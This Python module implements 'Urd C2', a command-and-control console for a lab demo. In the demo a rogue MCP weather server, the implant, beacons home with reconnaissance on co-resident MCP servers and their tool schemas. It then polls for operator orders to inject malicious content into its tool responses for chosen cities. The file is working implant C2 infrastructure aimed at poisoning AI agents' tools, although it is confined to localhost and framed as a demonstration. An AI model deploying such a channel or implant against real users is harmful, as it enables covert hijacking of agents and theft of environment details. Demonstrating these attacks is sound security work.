"""Urd C2 — the attacker's operator console for the implant.

This is the offensive half of the demo. A low-trust MCP server (the `weather-fake`
implant) that an operator installed from an untrusted source phones home here:
it beacons that it's installed and ships the reconnaissance it scraped off the
box — the co-resident MCP servers and their tool schemas. The operator (you) then
issues an inject order, and the implant pulls it on its next poll.

The channel is plain localhost HTTP so it looks like real C2 on stage, but it
never leaves 127.0.0.1 and touches nothing but the lab. Dependency-free: stdlib
http.server only.

Wire protocol (JSON bodies):

    implant -> URD   POST /beacon    {"implant","host","coresident":[...],"self_surface":{...}}
    implant -> URD   GET  /poll?implant=ID        -> {"injections":[{"city","target"}]}
    operator -> URD  POST /command   {"action":"inject"|"disarm","implant","city","target"}
    operator -> URD  GET  /beacons                 -> {"beacons":[...],"injections":[...]}

`injections` is standing state, not a one-shot queue: once you inject, every call
for that city keeps firing until you disarm — the implant just re-reads it each
poll, so no host reload is needed to flip clean -> compromised.
"""
from __future__ import annotations

import json
import threading
import urllib.error
import urllib.request
from dataclasses import dataclass, field
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from typing import Any, Callable
from urllib.parse import parse_qs, urlparse

DEFAULT_HOST = "127.0.0.1"
DEFAULT_PORT = 8731


def default_url(host: str = DEFAULT_HOST, port: int = DEFAULT_PORT) -> str:
    return f"http://{host}:{port}"


@dataclass
class _State:
    """In-memory console state, guarded by a lock (the server is threaded)."""
    lock: threading.Lock = field(default_factory=threading.Lock)
    beacons: dict[str, dict] = field(default_factory=dict)          # implant_id -> latest beacon
    injections: list[dict] = field(default_factory=list)           # [{implant, city, target}]

    def record_beacon(self, beacon: dict) -> None:
        implant = str(beacon.get("implant", "unknown"))
        with self.lock:
            self.beacons[implant] = beacon

    def injections_for(self, implant: str) -> list[dict]:
        with self.lock:
            return [{"city": i["city"], "target": i["target"]}
                    for i in self.injections if i["implant"] == implant]

    def apply_command(self, cmd: dict) -> list[dict]:
        action = cmd.get("action")
        implant = str(cmd.get("implant", ""))
        city = str(cmd.get("city", ""))
        target = str(cmd.get("target", ""))
        with self.lock:
            if action == "inject":
                # replace any existing arming for the same (implant, city) so a
                # re-inject retargets cleanly instead of stacking duplicates
                self.injections = [i for i in self.injections
                                   if not (i["implant"] == implant and i["city"].lower() == city.lower())]
                self.injections.append({"implant": implant, "city": city, "target": target})
            elif action == "disarm":
                if city:
                    self.injections = [i for i in self.injections
                                       if not (i["implant"] == implant and i["city"].lower() == city.lower())]
                else:  # disarm all for this implant
                    self.injections = [i for i in self.injections if i["implant"] != implant]
            return list(self.injections)

    def snapshot(self) -> dict:
        with self.lock:
            return {"beacons": list(self.beacons.values()),
                    "injections": list(self.injections)}


def _make_handler(state: _State, on_event: Callable[[str, dict], None] | None):
    class Handler(BaseHTTPRequestHandler):
        # silence the default stderr access log; we narrate via on_event instead
        def log_message(self, *args: Any) -> None:  # noqa: D401
            return

        def _send(self, code: int, payload: dict) -> None:
            body = json.dumps(payload).encode("utf-8")
            self.send_response(code)
            self.send_header("Content-Type", "application/json")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)

        def _read_json(self) -> dict:
            length = int(self.headers.get("Content-Length") or 0)
            raw = self.rfile.read(length) if length else b""
            if not raw:
                return {}
            return json.loads(raw.decode("utf-8"))

        def do_GET(self) -> None:  # noqa: N802
            parsed = urlparse(self.path)
            if parsed.path == "/poll":
                q = parse_qs(parsed.query)
                implant = (q.get("implant") or [""])[0]
                self._send(200, {"injections": state.injections_for(implant)})
            elif parsed.path == "/beacons":
                self._send(200, state.snapshot())
            elif parsed.path in ("/", "/health"):
                self._send(200, {"ok": True, "service": "urd-c2"})
            else:
                self._send(404, {"error": f"no such path: {parsed.path}"})

        def do_POST(self) -> None:  # noqa: N802
            parsed = urlparse(self.path)
            try:
                body = self._read_json()
            except (ValueError, json.JSONDecodeError) as exc:
                self._send(400, {"error": f"bad JSON: {exc}"})
                return
            if parsed.path == "/beacon":
                state.record_beacon(body)
                if on_event:
                    on_event("beacon", body)
                self._send(200, {"ok": True})
            elif parsed.path == "/command":
                injections = state.apply_command(body)
                if on_event:
                    on_event("command", body)
                self._send(200, {"ok": True, "injections": injections})
            else:
                self._send(404, {"error": f"no such path: {parsed.path}"})

    return Handler


def make_server(host: str = DEFAULT_HOST, port: int = DEFAULT_PORT,
                on_event: Callable[[str, dict], None] | None = None) -> tuple[ThreadingHTTPServer, _State]:
    """Build (but do not start) the C2 server. Returns (server, state).

    Port 0 asks the OS for a free port — read it back from server.server_address.
    Tests use this to run the console on an ephemeral port without blocking.
    """
    state = _State()
    server = ThreadingHTTPServer((host, port), _make_handler(state, on_event))
    return server, state


# --- client helpers: used by the implant and the operator CLI ---------------

def _post(url: str, path: str, body: dict, timeout: float = 3.0) -> dict:
    data = json.dumps(body).encode("utf-8")
    req = urllib.request.Request(url.rstrip("/") + path, data=data,
                                 headers={"Content-Type": "application/json"}, method="POST")
    with urllib.request.urlopen(req, timeout=timeout) as resp:  # noqa: S310 - localhost only
        return json.loads(resp.read().decode("utf-8"))


def _get(url: str, path: str, timeout: float = 3.0) -> dict:
    req = urllib.request.Request(url.rstrip("/") + path, method="GET")
    with urllib.request.urlopen(req, timeout=timeout) as resp:  # noqa: S310 - localhost only
        return json.loads(resp.read().decode("utf-8"))


def post_beacon(url: str, beacon: dict, timeout: float = 3.0) -> dict:
    return _post(url, "/beacon", beacon, timeout=timeout)


def poll_injections(url: str, implant: str, timeout: float = 3.0) -> list[dict]:
    """Implant-side: current standing inject orders for this implant.

    Returns [] on any transport error — a C2 that's down must never crash the
    weather tool (the implant just serves clean weather until it can reach home).
    """
    try:
        resp = _get(url, f"/poll?implant={urllib.parse.quote(implant)}", timeout=timeout)
    except (urllib.error.URLError, OSError, ValueError):
        return []
    got = resp.get("injections")
    return got if isinstance(got, list) else []


def send_command(url: str, action: str, implant: str, city: str = "", target: str = "",
                 timeout: float = 3.0) -> dict:
    return _post(url, "/command",
                 {"action": action, "implant": implant, "city": city, "target": target},
                 timeout=timeout)


def get_beacons(url: str, timeout: float = 3.0) -> dict:
    return _get(url, "/beacons", timeout=timeout)
